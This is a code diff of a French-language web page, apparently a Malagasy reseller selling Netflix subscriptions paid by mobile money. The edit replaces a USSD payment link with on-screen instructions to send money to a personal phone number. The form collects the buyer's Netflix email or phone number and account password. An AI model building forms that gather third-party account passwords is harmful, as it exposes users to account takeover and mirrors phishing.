@@ -121,17 +121,15 @@
         h2 { text-align: center; font-weight: 900; margin: 0 0 15px; font-size: 26px; text-transform: uppercase; }
         label { display: block; margin-top: 25px; color: #666; font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; }
         
-        /* ICI LE FIX POUR LE MENU DÉROULANT */
         select, input {
             width: 100%; padding: 19px; margin-top: 10px; border-radius: 18px;
             border: 1px solid rgba(255, 255, 255, 0.04); background: rgba(20, 20, 20, 0.8);
             color: white; font-size: 16px; box-sizing: border-box; outline: none;
         }
 
-        /* Correction du fond blanc sur les options */
         select option {
-            background-color: #111; /* Fond sombre pour les propositions */
-            color: white;           /* Texte blanc */
+            background-color: #111;
+            color: white;
         }
 
         .price-tag {
@@ -161,15 +159,21 @@
 
         /* SUCCESS VIEW */
         #success-view { display: none; text-align: center; animation: zoomIn 0.5s ease; }
-        .ussd-mega-btn {
-            background: linear-gradient(135deg, #fff 0%, #ccc 100%); color: #000;
-            padding: 26px; border-radius: 22px; text-decoration: none; display: block;
-            margin: 35px 0; font-weight: 900; font-size: 21px;
+        
+        .payment-number-box {
+            background: linear-gradient(135deg, rgba(255, 0, 0, 0.15) 0%, rgba(0, 0, 0, 0.5) 100%);
+            padding: 30px; 
+            border-radius: 22px; 
+            border: 1px solid var(--primary);
+            margin: 35px 0;
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.15);
         }
+
         .recap-box { background: rgba(0, 0, 0, 0.4); padding: 25px; border-radius: 20px; text-align: left; font-size: 14px; color: #ccc; }
 
         #loading-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--card-glass); border-radius: 40px; z-index: 10; justify-content: center; align-items: center; flex-direction: column; }
         .spinner { border: 4px solid rgba(255, 255, 255, 0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: var(--primary); animation: spin 1s linear infinite; margin-bottom: 15px; }
+        
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         @keyframes zoomIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
@@ -222,8 +226,8 @@
                     <span id="prixValeur">0 Ar</span>
                 </div>
 
-                <label>2. Adresse DU COMPTE NETFLIX</label>
-                <input type="email" id="email" placeholder="votre-email@gmail.com">
+                <label>2. Adresse ou numero DU COMPTE NETFLIX</label>
+                <input type="email" id="email" placeholder="E-mail@gmail.com ou numero mobile">
 
                 <label>3. MOT DE PASSE DU COMPTE</label>
                 <input type="password" id="password" placeholder="votre mot de passe">
@@ -244,7 +248,7 @@
     </div>
 
     <footer>
-        ZÉBU COINS MADAGASCAR &copy; 2026 • 037 65 444 36
+        ZÉBU COINS MADAGASCAR &copy; 2026 • 037 65 444 36 (en ligne seulement a 12h-14h et 20h-22h)
     </footer>
 
     <script type="module">
@@ -306,23 +310,25 @@
             }
 
             loadingOverlay.style.display = "none";
-            const montantNet = prixRaw.replace(/\s/g, '').replace('Ar', '');
-            let codeUSSD = mode === 'MVola' ? `tel:*111*1*2*0376544436*${montantNet}#` : 
-                           mode === 'Orange Money' ? `tel:*144*2*0376544436*${montantNet}#` : 
-                           `tel:*150*1*1*0376544436*${montantNet}#`;
 
             document.getElementById('formContainer').style.display = "none";
             document.querySelector('.promo-banner').style.display = "none";
             const successView = document.getElementById('success-view');
             successView.style.display = "block";
 
+            // NOUVEL AFFICHAGE SANS L'OUVERTURE DE L'APPLICATION TÉLÉPHONE
             successView.innerHTML = `
                 <div style="font-size:60px; margin-bottom:15px;">💫</div>
-                <h3>CONFIRMATION</h3>
-                <p>Transfert de <b>${prixRaw}</b> via ${mode}</p>
-                <a href="${codeUSSD}" class="ussd-mega-btn">LANCER LE PAIEMENT</a>
+                <h3 style="margin-bottom: 5px; text-transform: uppercase;">Instructions de paiement</h3>
+                <p style="color: #aaa; font-size: 14px;">Veuillez envoyer <b>${prixRaw}</b> via ${mode} au numéro ci-dessous :</p>
+                
+                <div class="payment-number-box">
+                    <span style="font-size: 12px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; color: #ff4d4d;">Envoyer l'argent à ce numéro</span><br>
+                    <strong style="display: block; margin-top: 10px; font-size: 32px; color: #fff; letter-spacing: 2px;">037 65 444 36</strong>
+                </div>
+
                 <div class="recap-box">Compte : <b>${email}</b><br>Source : <b>${tel}</b></div>
-                <button onclick="window.location.reload()" style="background:none; border:none; color:#555; cursor:pointer; margin-top:30px; font-weight:800; text-transform:uppercase;">Retour</button>
+                <button onclick="window.location.reload()" style="background:none; border:none; color:#555; cursor:pointer; margin-top:30px; font-weight:800; text-transform:uppercase;">Retour à l'accueil</button>
             `;
         }
     </script>
